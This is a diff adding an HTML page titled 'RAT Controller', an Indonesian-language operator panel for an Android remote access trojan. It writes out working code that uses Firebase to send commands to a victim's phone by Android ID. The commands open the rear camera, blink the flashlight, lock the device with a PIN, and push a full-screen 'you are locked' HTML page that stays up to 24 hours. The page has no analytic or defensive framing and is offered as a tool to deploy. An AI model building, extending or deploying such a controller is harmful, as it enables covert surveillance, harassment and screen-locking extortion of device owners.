@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RAT Controller - Prof Xch</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body style="font-family: monospace; background: #111; color: #0f0; padding: 20px;">
+    <h1>🔥 TUMBAL CONTROLLER [Prof Xch]</h1>
+    <label>Device ID (Android ID): <input id="deviceId" style="width:300px;" placeholder="Masukkan ANDROID_ID"></label><br><br>
+    <button onclick="sendCmd('camera_rear')">📷 Kamera Belakang (Preview 10s)</button>
+    <button onclick="sendCmd('flash_blink')">💡 Senter Kedip 900ms (Toggle)</button>
+    <br><br>
+    <label>PIN (min 4): <input id="pinInput" placeholder="1234"></label>
+    <button onclick="sendLockPin()">🔒 Lock PIN</button>
+    <hr>
+    <h3>📄 Lock Custom HTML (Auto dismiss 24 Jam)</h3>
+    <textarea id="htmlInput" rows="6" cols="50"><h1 style='color:red;'>ANDA TERKUNCI</h1><button onclick='AndroidLock.dismissLock()' style='font-size:30px;'>SELESAI</button></textarea><br>
+    <button onclick="sendCustomHtml()">🚀 Kirim HTML Lock</button>
+    <p style="color:red;">* Jika HTML tidak dismiss, akan hilang sendiri setelah 24 jam.</p>
+
+    <script>
+        // ==== GANTI DENGAN CONFIG DARI FIREBASE WEB ANDA ====
+        const firebaseConfig = {
+            apiKey: "AIzaSy.......", // GANTI
+            authDomain: "xxxx.firebaseapp.com",
+            databaseURL: "https://xxxx-default-rtdb.firebaseio.com", // GANTI
+            projectId: "xxxx",
+            storageBucket: "xxxx.appspot.com",
+            messagingSenderId: "123456",
+            appId: "1:123456:web:abcdef"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        function getDeviceId() { return document.getElementById('deviceId').value; }
+
+        function sendCmd(type, payload = {}) {
+            const id = getDeviceId();
+            if(!id) return alert('Masukkan Device ID!');
+            db.ref('commands/' + id).set({ type, ...payload, timestamp: Date.now() });
+        }
+
+        function sendLockPin() {
+            const pin = document.getElementById('pinInput').value;
+            if(pin.length < 4) return alert('Min 4 digit');
+            sendCmd('lock_pin', { pin: pin });
+        }
+
+        function sendCustomHtml() {
+            const html = document.getElementById('htmlInput').value;
+            sendCmd('lock_html', { html: html });
+        }
+    </script>
+</body>
+</html>
